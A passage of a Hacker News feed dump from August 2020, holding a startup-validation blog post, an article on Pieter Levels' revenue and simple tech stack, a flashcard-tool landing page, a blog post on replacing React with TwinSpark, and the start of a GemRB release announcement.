<p>1 – Define your potential market, and your potential customer. You may already have a typical customer in mind, but try to drill down into something specific. It’s not enough to just say “This is for entrepreneurs”. Or “It’s for single mums”. You need to define them more clearly by their behaviours, as well as their primary characteristics. Try something like “Time-rich, cash-poor,&nbsp; freelancers who need extra sources of income”. Or “High net worth individuals who take more than ten flights for business a year”. </p>



<p>2 (Optional, but VERY strongly recommended) – Read <a href="http://momtestbook.com/">The Mom Test</a>. I think it’s the most important business book I’ve ever read, and it fundamentally changed how I talk to (potential) customers. It stopped me being obsessed with my product, and fall in love with the problem. I should get commission for how often I recommend it! If you have already read it, and are confident that you don’t need to refresh your memory, then move on to stage 3.</p>



<p>The Mom Test is a book that helps you speak to your customers in a way in which they can’t lie to you, subconsciously or otherwise. By talking about their life, and the problems they face around your area of interest, INSTEAD of your solution, you get an unfiltered, unbiased set of feedback about what they REALLY want to have solved. And not just feedback to the idea you have presented to them, which is probably a very different thing. This is a VERY important thing to understand, especially as “no market need” is the most often cited reason for startups failing.</p>



<p>Don’t let your ego get in the way of having a successful business. <strong>Your solution isn’t more important than their problem.</strong></p>



<p>If you don’t want to spend 3 hours reading the book, spend an hour<a href="https://www.youtube.com/watch?v=FG1Fa-t4AEQ&amp;t=0s"> watching the author talk about it</a>. If you don’t want to spend an hour watching that, spend three minutes watching<a href="https://www.youtube.com/watch?v=Hla1jzhan78"> this video</a>, or reading<a href="https://medium.com/@nataliekorotaeva/how-to-talk-with-your-users-3-takeaways-from-the-mom-test-by-rob-fitzpatrick-bbeb4a93ba07"> this blogpost</a>. Ideally you’ll do all of the above, just so you fully embrace the idea.</p>



<figure><img data-attachment-id="2359" data-permalink="https://neilcocker.com/nesa-by-makers-igur1ix0mqm-unsplash/" data-orig-file="https://neilcocker.files.wordpress.com/2020/08/nesa-by-makers-igur1ix0mqm-unsplash.jpg" data-orig-size="6720,4480" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="nesa-by-makers-igur1ix0mqm-unsplash" data-image-description="" data-medium-file="https://neilcocker.files.wordpress.com/2020/08/nesa-by-makers-igur1ix0mqm-unsplash.jpg?w=300" data-large-file="https://neilcocker.files.wordpress.com/2020/08/nesa-by-makers-igur1ix0mqm-unsplash.jpg?w=750" src="https://neilcocker.files.wordpress.com/2020/08/nesa-by-makers-igur1ix0mqm-unsplash.jpg?w=1024" alt="" srcset="https://neilcocker.files.wordpress.com/2020/08/nesa-by-makers-igur1ix0mqm-unsplash.jpg?w=1024 1024w, https://neilcocker.files.wordpress.com/2020/08/nesa-by-makers-igur1ix0mqm-unsplash.jpg?w=2048 2048w, https://neilcocker.files.wordpress.com/2020/08/nesa-by-makers-igur1ix0mqm-unsplash.jpg?w=150 150w, https://neilcocker.files.wordpress.com/2020/08/nesa-by-makers-igur1ix0mqm-unsplash.jpg?w=300 300w, https://neilcocker.files.wordpress.com/2020/08/nesa-by-makers-igur1ix0mqm-unsplash.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Photo by <a href="https://unsplash.com/@nesabymakers?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">NESA by Makers</a> on <a href="https://unsplash.com/s/photos/startup?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></figcaption></figure>



<p>3 – Write your hypothesis. I won’t write too much here, as there are lots of great blogposts out there that do a great job of explaining good ways of nailing this. In short, you’re looking to find a hypothesis that you can test with your customer conversations. There are several different templates for this, but this is a simple one to start with. </p>



<p><em>I believe [target market] will [engage in this behaviour / use this solution] for [this reason].</em></p>



<p>You can refine this as you go along, and as you speak to customers. After all, there’s a very good chance that your research will show you that your hypothesis is wrong – and therefore you’ve just saved yourself thousands of Pounds, Dollars, or Euros, and 2 years of your life. Yay!</p>



<p>If your hypothesis is proven wrong, you can come up with a new one, and start again. </p>



<p>4 – Design a survey that is easy to distribute, and easy to fill in (multiple choice here). The idea is to capture some rough data, but mainly it’s the top of a funnel for getting people on the phone to the real interviews. </p>



<p>Here’s <a href="https://docs.google.com/forms/d/e/1FAIpQLSdSwINF3uDxeD2fx0Y5sWaX9esyrG39HzCzeXSPMcwMRo5wnw/viewform?usp=sf_link">an example of a real, live survey</a> that I’m currently using to capture data from potential customers. Feel free to steal the format, and also <strong>feel free to fill it in if you’re an early stage founder, too</strong>.</p>



<p>I’ve used Google Forms in this example, but I also heartily recommend the services of <a href="https://doopoll.co/">Doopoll</a>.</p>



<p>Make it mainly multi-choice, to make it a low barrier to people filling t in, but if you feel like you want to devote one question to free-entry, then go ahead. It can sometimes be a simple “Is there anything else you would like to tell us?” thing at the end.</p>



<p>Distribute via the usual channels, and call in favours from people who can help you reach your target market.</p>



<p>Hint – <strong>Twitter is a search engine for human beings</strong>. Want to find people interested in, for example, medtech? There’s a ton of hashtags these people will use, and that info may also be in their bio. It wouldn’t take too long to tweet a few hundred of them with a polite message, asking them to give you 2 mins of their time to fill in the survey, as they’re interested in your area of research.</p>



<p>Bonus – it’s an email list for you to approach to be your beta users once you have an MVP up and running. But, be respectful. These people gave you their time for free, so don’t just add them to a never-ending drip campaign.</p>



<figure><img data-attachment-id="2357" data-permalink="https://neilcocker.com/daria-nepriakhina-zocdwpuirua-unsplash/" data-orig-file="https://neilcocker.files.wordpress.com/2020/08/daria-nepriakhina-zocdwpuirua-unsplash.jpg" data-orig-size="4032,2688" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="daria-nepriakhina-zocdwpuirua-unsplash" data-image-description="" data-medium-file="https://neilcocker.files.wordpress.com/2020/08/daria-nepriakhina-zocdwpuirua-unsplash.jpg?w=300" data-large-file="https://neilcocker.files.wordpress.com/2020/08/daria-nepriakhina-zocdwpuirua-unsplash.jpg?w=750" src="https://neilcocker.files.wordpress.com/2020/08/daria-nepriakhina-zocdwpuirua-unsplash.jpg?w=1024" alt="" srcset="https://neilcocker.files.wordpress.com/2020/08/daria-nepriakhina-zocdwpuirua-unsplash.jpg?w=1024 1024w, https://neilcocker.files.wordpress.com/2020/08/daria-nepriakhina-zocdwpuirua-unsplash.jpg?w=2048 2048w, https://neilcocker.files.wordpress.com/2020/08/daria-nepriakhina-zocdwpuirua-unsplash.jpg?w=150 150w, https://neilcocker.files.wordpress.com/2020/08/daria-nepriakhina-zocdwpuirua-unsplash.jpg?w=300 300w, https://neilcocker.files.wordpress.com/2020/08/daria-nepriakhina-zocdwpuirua-unsplash.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Photo by <a href="https://unsplash.com/@epicantus?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Daria Nepriakhina</a> on <a href="https://unsplash.com/s/photos/research?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></figcaption></figure>



<p>4 – Speak to the ones you have chosen. Read The Mom Test *before* you speak to them. It’ll allow you to ask questions that get to the root of the real problems they face in this area, and not just answer questions that are limited to the scope of your proposed product. In an ideal world, they’ll end the session not having a clue what your product is. It’s all about them, NOT your product.</p>



<p>I’d strongly recommend speaking to at least 25 people. Preferably more like 50. If you have chosen a well-enough defined target (and not just something vague like “car owners” or “entrepreneurs”), and you listen carefully, clear trends will start to emerge. And these may well be problems that you can solve!</p>



<p>Hint – I strongly recommend Calendly (or similar) to provide a 15 or 20-min link to your interviewees, allowing them to book the relevant slot in your calendar. This will give them confidence that you intend to honour your 15 min promise. It also keeps you concise in your questioning, and get to the point. If they’re happy to keep talking, that’s great. But don’t abuse their goodwill.</p>



<p>Finally – Fall in love with the problem, not your product. The market, in a true economic sense, doesn’t care about your product. It only cares about you being able to solve a problem. Don’t succumb to Ugly Baby Syndrome, where you have come up with an idea that you LOVE, and you’re deaf to any market signals that tell you that it’s no good.</p>



<p>I know that I’ve made this mistake in the past. To be enthusiastic, and in love with your idea is a very normal thing. And it’s particularly typical of entrepreneurs, as we’re all out trying to change the world. But we’ve been mis-sold the concept that the moment of genius, and the idea itself, is sacrosanct. But successful entrepreneurship is about a disciplined process. And validation is an absolutely vital part of it.</p>



<p>I once had the “product-first instead of problem-first” way of doing things described to me as “<strong>designing a key (product) and running around trying to find a lock (problem) that it will open</strong>“. Surely it’s much better to find a lock, study it, understand it, then design a key to open it. </p>



<p>If you’ve done all the steps above, you now understand the lock MUCH better. Go make a key to open it.</p>



<p>Update – I’ve had a few people ask for my input on their ideas. If you’d like a free mentoring session, you can <a href="https://neilcocker.com/toughquestions/">book in here</a>.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article><!-- #post-## -->
						
	<nav role="navigation" aria-label="Posts">
		<h2>Post navigation</h2>
		
	</nav>
						
<!-- #comments -->

					
				</main><!-- #main -->
			</div><!-- #primary -->
			
<!-- #secondary -->
		</div><!-- .row -->
	</div><!-- .container -->
</section><!-- #main -->



		<!-- #colophon -->
	</div></div>]]>
            </description>
            <link>https://neilcocker.com/2020/08/22/my-startup-validation-process/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259246</guid>
            <pubDate>Mon, 24 Aug 2020 10:30:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pieter Levels Makes $600k a Year from Nomad List and Remote OK]]>
            </title>
            <description>
<![CDATA[
Score 284 | Comments 139 (<a href="https://news.ycombinator.com/item?id=24259201">thread link</a>) | @Pete-Codes
<br/>
August 24, 2020 | https://www.nocsdegree.com/pieter-levels-learn-coding/ | <a href="https://web.archive.org/web/*/https://www.nocsdegree.com/pieter-levels-learn-coding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <div>
                        <p><a href="https://twitter.com/levelsio">Pieter Levels </a>makes about $600,000 a year. He taught himself to code and has an unconventional philosophy. This is not an interview but an analysis piece. Pieter defied the critics and built Nomad List and Remote OK into successful businesses without cutting edge tools like React or other modern frameworks. If you would like to learn more about the business side of things, check out my new product, <a href="https://gum.co/hCrax">How Does This Make Revenue?</a></p><h2 id="who-is-pieter-levels">Who is Pieter Levels</h2><p>Pieter is a self-taught developer from The Netherlands. He has an MBA but no coding qualifications. As we will see in today's article he has a rough and ready approach to coding but it pays off handsomely. </p><p>His <a href="https://www.nomadlist.com/">Nomad List</a> directory and community for digital nomads draws in over $300k a year and that's despite a recent fall in revenue due to people not travelling during the Corona virus crisis. </p><figure><img src="https://www.nocsdegree.com/content/images/2020/05/Screenshot-2020-05-14-at-23.30.06.png" alt=""></figure><p>His Remote Ok job board for remote workers made <a href="https://remoteok.io/open">$300,000 over the last 12 months</a></p><figure><img src="https://www.nocsdegree.com/content/images/2020/05/Screenshot-2020-05-14-at-23.23.51.png" alt="Revenue chart for Remote OK job board"></figure><p>So that's a total of $600,00 from the last 12 months! Not bad for a self-taught developer! Pieter is active on Twitter and has a very stong following there. </p><p>As he works for himself he is able to travel extensively and live where he choses. Although, rather than the common misconception of digital nomads being constantly on the move, Pieter recommends spending a few months in each place. This way you avoid travel burnout. </p><h2 id="how-did-pieter-levels-learn-to-code">How did Pieter Levels learn to code?</h2><p>Not a lot is known about his very earlies forays into coding apart from the fact that as a teenager he played around programming. His first attempt at a web business was an analytics service for Youtube which would let you see how all your videos/channels were performing in one place. Unfortunately, he worked on it for a year without making any money from it. </p><p>From that point Pieter adopted his now familar approach to coding and business - build websites quickly and monetize from the beginning. He only adds more features if there is money coming in and the idea is validated by the market.</p><p>Pieter takes the "search on Google" approach to Google. So when he wanted to connect a database to a website or make a button do something on his website he would just search the terms on Google and find solutions in places like Stackoverflow. Pieter is a strong critic of the approach of doing courses as he believes people learn best by doing and building. </p><p>One analogy would be different approaches to learning Spanish. One person might study a course, learn the correct grammar and then go to Spain. Whereas Pieter would go to Spain, ask for the words he needs to use and go from there. </p><p>When asked in the past why he didn't use modern frameworks like React he made the point that as he was a solo founder he couldn't afford to spend time re-building his websites as this would mean his project would stall. </p><!--kg-card-begin: markdown--><p><a href="https://gum.co/GGofo"><img src="https://www.nocsdegree.com/content/images/2020/08/monetize.png" alt="monetize"></a></p>
<!--kg-card-end: markdown--><h2 id="what-technologies-does-pieter-levels-use">What technologies does Pieter Levels use?</h2><p>Pieter is famous (or infamous) for having a rather eccentric choice of stack by modern standards. It's essentially the easiest, least glamorous tools you could imagine. But that's ok because Pieter makes $600k a year! </p><p>Here is his stack:</p><ul><li>HTML (hand coded so no template to make life easier)</li><li>CSS (He has used pre-processors like LESS and SASS in the past)</li><li>Javascript (No frameworks - this is sometimes referred to jokingly as Vanilla Javascript. There is no such thing as Vanilla JS though. It's just plain-old Javascript without a framework such as React, Vue or Angular) </li><li>jQuery (An unfashionable choice nowadays but it does the job)</li><li>PHP (He doesn't use any frameworks like Laravel)</li><li>SQLite - Pieter says it's super quick and swears by it. SQLite is a database written in a single file so Pieter doesn't need to set up a server for it. &nbsp;</li><li>his sites are hosted on a single VPS running Ubuntu with NGINX.</li></ul><p>Here are some modern options Pieter doesn't use </p><ul><li>React - he jokes a lot about how he never wants to learn it due to it's (perceived) complexity. </li><li>Node - for a time he considered using it but he's never used it in production</li><li>Angular/ Vue - he doesn't use any Javascript frameworks </li><li>SQL/ Postgres - he doesn't use any of the conventional databases </li></ul><h2 id="get-a-job-without-a-cs-degree-">Get a job without a CS degree 👇</h2><!--kg-card-begin: markdown--><p><a href="http://nocsok.com/"><img src="https://www.nocsdegree.com/content/images/2020/08/Screenshot-2020-08-07-at-17.35.28-2.png" alt="No-CS-OK-screenshot-1"></a></p>
<!--kg-card-end: markdown--><h2 id="what-results-has-pieter-had-with-this-approach-to-coding">What results has Pieter had with this approach to coding?</h2><p>Despite the technical critics, Pieter has been consistently making six figures since 2014. He currently makes approximately $600,000 a year which is far more than most developers. He has been able to live in countries with a low cost of living so he will likely be able to have financial independence and not need to work relatively soon. </p><figure><blockquote data-width="550"><p lang="en" dir="ltr">📈 Record sales yesterday of $2,342.04 on <a href="https://t.co/S9Qv34rpbP">https://t.co/S9Qv34rpbP</a> for no apparent reason (maybe companies are spending their EOY HR budgets?). Normal sales is like $299 or 1 post per day. <a href="https://t.co/8HukglDuiv">pic.twitter.com/8HukglDuiv</a></p>— ؜ (@levelsio) <a href="https://twitter.com/levelsio/status/938699122445451265?ref_src=twsrc%5Etfw">December 7, 2017</a></blockquote>

</figure><figure><blockquote data-width="550"><p lang="en" dir="ltr"><a href="https://t.co/rORz8xdCQp">https://t.co/rORz8xdCQp</a> is a single PHP file called "index.php" generating $2,342.04 in a day. No frameworks. No libraries. 💖</p>— ؜ (@levelsio) <a href="https://twitter.com/levelsio/status/938707166508154880?ref_src=twsrc%5Etfw">December 7, 2017</a></blockquote>

</figure><h2 id="what-is-pieter-levels-working-on-now">What is Pieter Levels working on now?</h2><p>He just released a new project, <a href="https://remoteworkers.dev/">Remote Workers</a>, where people can post their resumé. He "built in public" - that is to say he gave daily updates of his code on Twitter. This is also a great way for developers to build an audience! You can check out what people are saying about Remote Workers on <a href="https://www.producthunt.com/posts/remote-workers">Product Hunt</a>. </p><h2 id="conclusion">Conclusion</h2><p>Pieter is like a bare knuckle boxer so don't compare him to a Judo practioner going to the Olympics. One is going to win no matter what and one is going to follow the rules they have trained under and have finer technique. Neither is better or worse. It depends on the situation. </p><p>Pieter's approach would not be good if you were trying to get a job in a lot of companies. But Pieter isn't looking for a job and the proof for him is in his bank balance. So Pieter's scrappy technique is better suited if you are attracted to coding for entrepreneurship and being a solo founder who doesn't have to share their code with others to work on. He doesn't use Github to save his code, for instance and this is an industry standard that most employers expect. If you want to be an indie hacker/entrepreneur though then Pieter is a fine act to follow. </p><h3 id="if-you-enjoyed-this-article-please-send-it-to-a-friend">If you enjoyed this article please send it to a friend </h3><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="and-you-should-totally-sign-up-for-the-newsletter">And you should totally <a href="https://nocsdegree.carrd.co/">sign up for the newsletter</a> </h3>
                    </div>
                </section></div>]]>
            </description>
            <link>https://www.nocsdegree.com/pieter-levels-learn-coding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259201</guid>
            <pubDate>Mon, 24 Aug 2020 10:21:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I built a collaborative flashcard tool]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24259037">thread link</a>) | @mvind
<br/>
August 24, 2020 | https://memordo.com/launch/hn | <a href="https://web.archive.org/web/*/https://memordo.com/launch/hn">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>All your flashcards are stored safely in the cloud. Create and review
                    flashcards instantly on any platform. </p><p>
                    <span>
                        <span><i></i></span> Study using Spaced Repetition
                        <br>
                        <span><i></i></span> Cram for Special Occasions
                        <br>
                        <span><i></i></span> 100% Custom Review Schedules
                        <br>
                        <span><i></i></span> Get Data Analytics and
                        Statitics on your Studying <br>
                    </span></p></div></div>]]>
            </description>
            <link>https://memordo.com/launch/hn</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259037</guid>
            <pubDate>Mon, 24 Aug 2020 09:52:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A tale of webpage speed, or throwing away React]]>
            </title>
            <description>
<![CDATA[
Score 351 | Comments 294 (<a href="https://news.ycombinator.com/item?id=24258855">thread link</a>) | @todsacerdoti
<br/>
August 24, 2020 | https://solovyov.net/blog/2020/a-tale-of-webpage-speed-or-throwing-away-react/ | <a href="https://web.archive.org/web/*/https://solovyov.net/blog/2020/a-tale-of-webpage-speed-or-throwing-away-react/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody">
  <p>Back in 2011, I happened to get a job writing <a href="https://backbonejs.org/">Backbone.js</a> app. If you never did that, don’t. I was complaining about difficulties with composition left and right to whoever would listen. As I started digging into alternatives for the front-end, I discovered <a href="https://en.wikipedia.org/wiki/Functional_reactive_programming">FRP</a> and <a href="https://www.flapjax-lang.org/">Flapjax</a>, and <a href="https://clojurescript.org/">ClojureScript</a>. The last one got me hooked on <a href="https://clojure.org/">Clojure</a>. I even did a <a href="https://fwdays.com/event/js-frameworks-day-2013/review/Functional-Reactive-Programming-&amp;-ClojureScript">successful talk</a> on FRP and ClojureScript (and precursor to <a href="https://hoplon.io/">Hoplon</a>, called hlisp).</p>
<h2 id="react">React</h2>
<p>Then in May 2013 React was released. I championed it on my new job and discovered during Clojure-themed hackaton (<a href="https://solovyov.net/blog/2013/clojurecup/">Clojure Cup 2013</a>) that CLJS and React are a great match. What’s so good about React though? To me, the main selling point is that it composes well.</p>
<p>When you use predecessors like jQuery or Backbone or Angular or whatever after just a year of development your code is a mess of event listeners and triggers. Don’t get me started on unobtrusive JS, code locality is non-existent with jQuery. Which handler is bound where and what it does? It’s too hard to discover to be a good base for a good codebase!</p>
<p>Then I started working at <a href="https://kasta.ua/">Kasta</a>, where web frontend was exactly that jQuery-ish mess. Nobody ever wanted to touch checkout, since you could spend hours, if not days, making the smallest change. Then QA would find more invalid states than you can dream of. And then users would report more bugs to our call center. It was just as awful as you can imagine.</p>
<p>So after some experiments, tests, and checks, I decided that we’re going React + ClojureScript way with server-side rendering done in Clojure.</p>
<h2 id="demise">Demise</h2>
<p>And for a while, things were looking good. We had this <a href="https://solovyov.net/blog/2017/server-side-rendering/">architecture</a> where our components are executed as Clojure on the backend, so no Node.js on the server, hurray! And developer UX is through the roof with the excellent live reload (thanks CLJS), ability to connect from your editor to browser REPL, and experiment there. It is just great!</p>
<p>To make a long story short, our frontend grew bigger and bigger. Incremental compilation started to become slower — it now routinely takes more than a second or two. And while there were few attempts on keeping the whole app performant, ultimately we failed. It’s a death by a thousand cuts. The application became too big and its boot time became too long. Server side rendering helps partially, but then hydration freezes the browser. On the older hardware or Androids it became unacceptable!</p>
<p>One of the main reasonings back in 2016 was that we take a hit on startup time, but in turn, get no page loads and have a rich web application with a lot of interactions. And for a while that worked! But startup time became longer and longer, leading to a shameful rating of 5/100 from Google’s PageSpeed (okay, it was sometimes up to ~25/100, whatever).</p>
<p>More than that, while doing what is described below, we’ve discovered that React also leads to some questionable practices. Like hovers in JS (rather than in CSS), drop-down menus in JS, not rendering hidden (under a hover) text (Google won’t be happy), weird complex logic (since it’s possible!), etc. You can have a React app without those problems, but apparently, you have to have better self-control than we had (nobody’s perfect!).</p>
<p>Also since then, the vast majority of our users switched to mobile apps. This made the web app the main entry point for new users. This means its main goal is rendering fast for a newcomer, because old-timers, which want more functionality, are on mobile app now. And <a href="https://web.dev/tti/">TTI</a> (time to interactive) is so much more important here.</p>
<h2 id="time-for-a-change">Time For A Change</h2>
<p>So given that circumstances have changed, what do we do? I read articles “how I survive on vanilla JS” since before React appeared and they usually don’t make sense — it’s either a pink-glassed rant about how great it is, disregarding all the problems (separation of concerns, cohesion, composability, code locality) or a project by one (or few) persons, who just keep everything in their head.</p>
<p>Somewhere back in February I stumbled upon <a href="https://intercoolerjs.org/">Intercooler.js</a>. I’m not sure if I ever saw it before — maybe I did but skimmed over — it does not matter. This time it captured my attention.</p>
<p>The idea is that all HTML is rendered on the server. And client updates parts of HTML, controlled by element’s attributes. Basically like HTML+XHR on steroids. You can’t do anything you want, but that’s partially the point: some limits are good so you won’t do crazy stuff. And you need some support from the server, so you can render partial results — just an optimization, but quite an important one.</p>
<p>There is an alternative library — <a href="https://unpoly.com/">Unpoly</a>. It has more features around layout and styling but has a little bit less thought out XHR stuff (hard to do a POST request with parameters without having a form, for example). And the library size is much bigger. And it’s written in CoffeeScript with lots of classes, <a href="https://solovyov.net/blog/2020/inheritance/">ugh</a>.</p>
<p>So I made a proof-of-concept implementation of our catalogue page in Intercooler and it worked! Except there was a dependency on jQuery and some other irritating stuff… As I was struggling to make a batch request for HTML fragments I understood one thing: when I wrote down a roadmap for catalogue the last point was “small intercooler-like thing for analytics”.</p>
<p>So why wait?</p>
<h2 id="twinspark">TwinSpark</h2>
<p>I liked Intercooler’s coherent approach to working around AJAX, so I decided to name the library after some automotive stuff as well, and TwinSpark seems like an appropriate name. So what’s the deal?</p>
<p><a href="https://github.com/kasta-ua/twinspark-js">TwinSpark</a> is a framework for declarative HTML enhancement: you put additional attributes on your element and TwinSpark does something with them. Like makes an AJAX call and replaces target with a response, or adds a class, or… well, see <a href="https://kasta-ua.github.io/twinspark-js/">examples</a>, shall you?</p>
<p>There are some differences with Intercooler, of course, because why would it exist? The most noticeable one is that there is no dependency on jQuery. It supports only modern browsers (not IE or Opera Mini) but drops that 88kb monster.</p>
<p>It also has:</p>
<ul>
<li>no inheritance — can’t stress that enough!</li>
<li>clear extension points for your directives</li>
<li>support for batching requests to a server</li>
<li>tighter attribute name convention (my own opinion, but <code>ic-get</code> and <code>ic-post</code> irritate me: do not make me change keys!)</li>
<li>much smaller payload (thanks to no jQuery!)</li>
<li>should be faster (thanks to no jQuery again)</li>
</ul>
<p>Honestly speaking, the main reasons are <a href="https://kasta-ua.github.io/twinspark-js/#batch">batching</a> and <a href="https://solovyov.net/blog/2020/inheritance/">no inheritance</a>. Inheritance is particularly painful here. In Intercooler, if you declared <code>ic-target</code> on the body, all tags inside will think it’s their target too. So you include a component somewhere in HTML tree and an attribute higher on tree changes this component behavior. I mean this is a freaking dynamic scope, I want none of that! :)</p>
<p>Funnily enough, after about a month of dabbling with TwinSpark, Intercooler’s author announced that he’s doing a jQuery-less modern version: <a href="https://htmx.org/">htmx</a>. :) It has really good extensions points, so maybe it’s possible to add batching… but inheritance is still there. :-(</p>
<h2 id="why-is-that-a-good-idea">Why is that a good idea</h2>
<p>We need to look at it from two sides: if it’s good for developers and if it’s good for users. React was great at former and terrible at later.</p>
<p>TwinSpark approach is much better in most cases for the user: less JavaScript, less jitter, more common HTML-like behavior. In the worst case, we would serve you 2.5MB of minified (non-gzipped) JS and 700KB of HTML (half of it were initial data for React) for catalogue. JS bundle is not that big because of embedded images or css or some other obscure stuff, it’s big because it’s the whole app, with a lot of views and logic.</p>
<p>Now it’s 40KB of minified non-gzipped JS (TwinSpark, analytics, some behavior, IntersectionObserver polyfill) and 350KB of HTML. Two orders of magnitude difference and even HTML is smaller! This is just like Christmas in childhood!</p>
<p>On the developer side, I think React is better still, but code locality is great, composability is much better (since you are forced in a limited world of working in a simplistic model) than with jQuery. Plus there are a lot of ways to improve it.</p>
<p>The good news is that the development process did not change that much! We’re still writing components that query necessary data from site-wide memory store (and make a call to API when needed), but they are executed only on the server. We effectively piggy-backend on our previous architecture, and this gives us the perfect ability to render “partial” HTML - since components do not wait for some “controller” to give them all necessary data. This is what allowed us to have both React and non-React versions to co-exist and make an A/B test without writing the markup twice.</p>
<h2 id="results">Results</h2>
<p>It took us four months since the first experiments to release. Not exactly the amount of time I imagined when we started (“should take two to three weeks at most!"), heh, but we were not exclusively doing that. It still took a lot of time and energy to remove React-isms from the code and wrangle our app to be a server-side citizen. It still could use some polishing, but we decided to release it despite that just to cut it short. And A/B test showed that we were right — especially for Android phones.</p>
<p>Google gives our catalogue 75/100 now instead of 5/100. Hurray, I guess? :)</p>

  </section></div>]]>
            </description>
            <link>https://solovyov.net/blog/2020/a-tale-of-webpage-speed-or-throwing-away-react/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24258855</guid>
            <pubDate>Mon, 24 Aug 2020 09:25:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The GemRB project celebrates 20 year anniversary with a new release]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 14 (<a href="https://news.ycombinator.com/item?id=24258780">thread link</a>) | @Lightkey
<br/>
August 24, 2020 | https://gemrb.org/2020/08/24/the-gemrb-project-celebrates-20-year-anniversary-with-a-new-release.html | <a href="https://web.archive.org/web/*/https://gemrb.org/2020/08/24/the-gemrb-project-celebrates-20-year-anniversary-with-a-new-release.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
        </header>
      

      <section itemprop="text">
        
        <p>The GemRB team announces the availability of GemRB 0.8.7, a new minor release to kick off
a week of celebrations of the project’s founding anniversary. 20 years ago, on the 21st of
August, the project initiator Daniele Colantoni registered it on SourceForge to try to make
it a team effort. Many things have happened since, the path was convoluted and bumpy, but
GemRB has continued to grow throughout the years.</p>

<p>GemRB is a portable free/libre open-source implementation of Bioware’s Infinity Engine, which
powered classic CRPGs like Baldur’s Gate, Icewind Dale and Planescape: Torment. The goal of
the project is to make these games available on a wide range of platforms forever, fix or avoid
old bugs, add new features and provide a superb platform for mod (and eventually game) development.</p>

<p>It was started 20 years ago by a student fresh out of town, Daniele Colantoni:
<em>“I missed playing D&amp;D with my friends so much /…/ I wanted to create my game to play
via internet. So I started my personal reverse engineering process on the base files
from Baldur’s Gate.”</em></p>

<p>Predictably it turned out to be much more complicated and time consuming than first
imagined, but the effort continued. From its Windows-only 32-bit beginnings GemRB was
made to run on all common and many niche platforms (from AmigaOS to IRIX and Symbian;
x86 to PPC, ARM, MIPS and WebAssembly). This was largely made possible through use
of open source libraries that are themselves very portable (SDL, OpenAL, libpython, zlib).
Without an open development model and supporting infrastructure, the project would have
never succeeded.</p>

<figure>
  
    
      <a href="https://gemrb.org/assets/img/screenshots/iwd2-kuldahar-gem.jpg" title="IWD2 remains to be fully understood">
          <img src="https://gemrb.org/assets/img/screenshots/thumb/iwd2-kuldahar-gem.jpg" alt="IWD2 GemRB battle screenshot">
      </a>
    
  
    
      <a href="https://gemrb.org/assets/img/screenshots/10pp6.jpg" title="Larger player parties is one of the most popular features">
          <img src="https://gemrb.org/assets/img/screenshots/thumb/10pp6.jpg" alt="10pp6.jpg">
      </a>
    
  
    
      <a href="https://gemrb.org/assets/img/screenshots/iwd2stylecombat2.jpg" title="IWD2-style combat output">
          <img src="https://gemrb.org/assets/img/screenshots/thumb/iwd2stylecombat2.jpg" alt="IWD2-style combat output">
      </a>
    
  
    
      <a href="https://gemrb.org/assets/img/screenshots/goi.jpg" title="Glory of Istar game shot">
          <img src="https://gemrb.org/assets/img/screenshots/thumb/goi.jpg" alt="Glory of Istar game shot">
      </a>
    
  
    
      <a href="https://gemrb.org/assets/img/screenshots/sorcerer_monk.jpg" title="Sorcerer/monk multiclass">
          <img src="https://gemrb.org/assets/img/screenshots/thumb/sorcerer_monk.jpg" alt="Sorcerer/monk multiclass">
      </a>
    
  
    
      <a href="https://lynxlynx.info/bugs/mushroom.madness.jpg" title="Sometimes things go hilariously wrong ...">
          <img src="https://gemrb.org/assets/img/screenshots/thumb/fonts.png" alt="Sometimes things just go wrong ...">
      </a>
    
  
  
    <figcaption>Various screenshots.
</figcaption>
  
</figure>

<p>The engine can be used to play the full Baldur’s Gate saga, the first Icewind Dale and
Planescape: Torment. The latter requires more reverse engineering and polishing, but
one can finish the game already. Icewind Dale 2 is a different matter — while it
appears more polished than Torment, only the first two chapters of the game are
playable.</p>

